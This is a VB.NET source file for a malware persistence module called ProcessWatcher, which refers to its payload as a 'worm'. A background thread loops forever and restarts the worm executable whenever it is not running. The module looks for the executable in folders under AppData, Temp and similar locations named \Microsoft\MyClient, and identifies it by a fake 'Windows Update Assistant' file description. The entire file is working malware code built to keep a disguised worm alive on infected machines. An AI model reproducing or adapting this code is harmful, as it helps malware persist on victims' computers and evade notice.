Imports System.Diagnostics
Public Class ProcessWatcher
    Public st As Integer = 0
    Public trd As System.Threading.Thread
    Public Sub StartWatcher()
        st = 0
        trd = New System.Threading.Thread(AddressOf WatcherDeamon)
        trd.IsBackground = True
        trd.Start()
    End Sub
    Private Sub WatcherDeamon()
        On Error Resume Next
        Dim st As Integer = +1
        Do While st <> 2
            If Process.GetProcessesByName(GetWorm()).Length > 0 Then

            Else
                Process.Start(WormPath() & "\" & GetWorm() & ".exe")
            End If
        Loop
    End Sub
    Public Function WormPath() As String
        Dim path As String = ""
        If IO.Directory.Exists(Environ("AppData") & "\Microsoft\MyClient") Then
            path = Environ("AppData") & "\Microsoft\MyClient"
        ElseIf IO.Directory.Exists(Environ("Temp") & "\Microsoft\MyClient") Then
            path = Environ("Temp") & "\Microsoft\MyClient"
        ElseIf IO.Directory.Exists(Environ("UserProfile") & "\Microsoft\MyClient") Then
            path = Environ("UserProfile") & "\Microsoft\MyClient"
        ElseIf IO.Directory.Exists(Environ("ProgramData") & "\Microsoft\MyClient") Then
            path = Environ("ProgramData") & "\Microsoft\MyClient"
        ElseIf IO.Directory.Exists(Environ("WinDir") & "\Microsoft\MyClient") Then
            path = Environ("WinDir") & "\Microsoft\MyClient"
        Else
            path = Application.StartupPath
        End If
        Return path
    End Function
    Public Function GetWorm() As String
        Dim WormFile() As String = IO.Directory.GetFiles(WormPath)
        For Each file As String In WormFile
            Dim a As New IO.FileInfo(file)
            If FileVersionInfo.GetVersionInfo(a.FullName).FileDescription = "Windows Update Assistant" Then
                Return a.Name.Split(".")(0)
            End If
        Next
    End Function
End Class